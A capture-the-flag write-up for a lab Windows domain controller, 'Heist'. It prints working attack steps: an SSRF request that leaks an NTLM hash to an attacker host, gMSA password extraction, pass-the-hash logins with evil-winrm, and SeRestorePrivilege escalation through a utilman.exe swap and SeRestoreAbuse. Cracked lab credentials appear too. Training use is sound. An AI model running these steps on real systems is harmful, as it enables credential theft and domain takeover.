# Heist
### Enumeration
```
# Nmap 7.92 scan initiated Tue May 10 18:49:45 2022 as: nmap -sCV -v -p- -oN nmap/tcp_all.out 192.168.218.165
Nmap scan report for ip-192-168-218-165.eu-west-1.compute.internal (192.168.218.165)
Host is up (0.014s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-10 18:51:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.heist.offsec
| Issuer: commonName=DC01.heist.offsec
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-02-14T15:17:57
| Not valid after:  2022-08-16T15:17:57
| MD5:   8926 ae5a 0def b886 1b41 bb70 f459 23c7
|_SHA-1: 399e b756 ed3e 3063 08b4 4ce0 66fc a470 34ce 85c5
| rdp-ntlm-info:
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
|   DNS_Tree_Name: heist.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2022-05-10T18:52:46+00:00
|_ssl-date: 2022-05-10T18:53:26+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Super Secure Web Browser
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### AD Enumeration
None of the AD-related services are open to anonymous users.

#### 8080
Python webserver. It takes a `url` parameter and retrieves the contents of that parameter (which it assumes is a webpage).

I spent a while trying to use `file://` URLs to dump local files. I also tried UNC paths like `//192.168.49.218` and `\\192.168.49.218` in combination with `responder` to leak an NTLM hash.

Ultimately, I couldn't get any of these to work and checked the hint. This suggested that I was on the right path in trying to leak a hash. The hint specifically mentioned the acronym SSRF, so I googled `SSRF NTLM hash` and found [this article](https://blog.blazeinfosec.com/leveraging-web-application-vulnerabilities-to-steal-ntlm-hashes-2/), which explains that `responder` is able to get hashes even from an HTTP request.

I started `responder` and made a request to `http://192.168.218.165:8080/?url=http://192.168.49.218/`. This gave me the hash below:

```
enox::HEIST:0670f1b98ca2012a:14DB109EF3D28F8A0B14A34C65845B56:0101000000000000C9BCF500AB64D80133449505B3541A4B0000000002000800360034005100530001001E00570049004E002D004B005100540042005400330057004C003200460051000400140036003400510053002E004C004F00430041004C0003003400570049004E002D004B005100540042005400330057004C003200460051002E0036003400510053002E004C004F00430041004C000500140036003400510053002E004C004F00430041004C000800300030000000000000000000000000300000EA07050D7D15A06A761ED67D7E9A22EAB46EB3F3FB7F2D573C4991DDA995A20D0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340039002E003200310038000000000000000000
```

This was cracked using `hashcat` to give the credentials: `enox:california`. We can't RDP with these credentials, but we can get a shell with `evil-winrm`. We grab the user flag, and notice a file, `todo.txt`, with the contents:

```
- Setup Flask Application for Secure Browser [DONE]
- Use group managed service account for apache [DONE]
- Migrate to apache
- Debug Flask Application [DONE]
- Remove Flask Application
- Submit IT Expenses file to admin. [DONE]
```

I ran BloodHound and found that there was a service account `svc_apache$` on which we had `ReadGMSAPassword`. The walkthrough details a slightly different path to this point, detailed next.

#### Walkthrough privilege escalation enumeration

First, run `dir C:\Users` to reveal a `svc_apache$` directory. Then, we'll enumerate groups for this service account and for the `enox` account:

```
Import-Module ActiveDirectory
Get-ADPrincipalGroupMembership svc_apache$ | select name

name
----
Domain Computers
Remote Management Users
```

Then, we check `enox` groups:

```
Get-ADPrincipalGroupMembership enox | select name

name
----
Domain Users
Remote Management Users
Web Admins
```

At this point, the walkthrough assumes that `Web Admins` has permission to read the GMSA password for `svc_apache$`. It confirms with the following command:

```
Get-ADServiceAccount -Identity 'svc_apache$' -Properties * | Select PrincipalsAllowedToRetrieveManagedPassword

PrincipalsAllowedToRetrieveManagedPassword
------------------------------------------
{CN=DC01,OU=Domain Controllers,DC=heist,DC=offsec, CN=Web Admins,CN=Users,DC=heist,DC=offsec}
```

From here, the walkthrough does the same thing, except it uses [`GMSAPasswordReader.exe`](https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe) ([link](https://github.com/rvazarkar/GMSAPasswordReader) to original repo) to read the password instead of using `ConvertFrom-ADManagedPasswordBlob` from the [`DSInternals`](https://github.com/MichaelGrafnetter/DSInternals) module.

First, we need to download the `DSInternals` [release](https://github.com/MichaelGrafnetter/DSInternals/releases/download/v4.7/DSInternals_v4.7.zip). Following the offline installation instructions, we upload to the target machine and:

- Run `Unblock-File dsinternals.zip`
- Unzip: `Expand-Archive dsinternals.zip -DestinationPath ./DSInternals`
- Load: `Import-Module ./DSInternals/DSInternals`

Now, we can retrieve the NT hash of the password for use with `evil-winrm`:

```powershell
$gmsa = Get-ADServiceAccount -Identity 'SVC_APACHE$' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
$securePassword = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword

# Or you can just pass the result directly to ConvertTo-NTHash
ConvertTo-NTHash $securePassword
```

From kali:

```shell
evil-winrm -u 'svc_apache$' -H 90fd559aa6a3aa6aa573a6f08686ca3b -i 192.168.170.165
```

Immediately, we notice a file `EnableSeRestorePrivilege.ps1` in the `Documents` directory, so let's check if we have `SeRestorePrivilege`:

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

This means we can do arbitrary writes. The intended path is to overwrite `C:\windows\system32\utilman.exe` with `C:\windows\system32\cmd.exe`, then connect to RDP using `rdesktop` without credentials, simply to get the login screen. Then we press `Cmd+U` (i.e. `Windows Key + U`) to trigger `utilman.exe` and an administrator command prompt flashes onto the screen. See https://github.com/gtworek/Priv2Admin.

An alternate route is to use `SeRestoreAbuse.exe` by `xct` to add a user to the administrators group. The source code is located [here](https://github.com/xct/SeRestoreAbuse). We must compile it ourselves, then upload it to the target machine. Then we execute:

```
./SeRestoreAbusex64.exe "cmd /c net localgroup administrators enox /add"
```

We have to relog as `enox`, but after that:

```
net users enox

User name                    enox
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/31/2021 6:09:05 AM
Password expires             Never
Password changeable          9/1/2021 6:09:05 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/15/2022 8:18:36 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Web Admins           *Domain Users
The command completed successfully.
```

We can see we're now a member of `Administrators`. We can now grab the root flag.
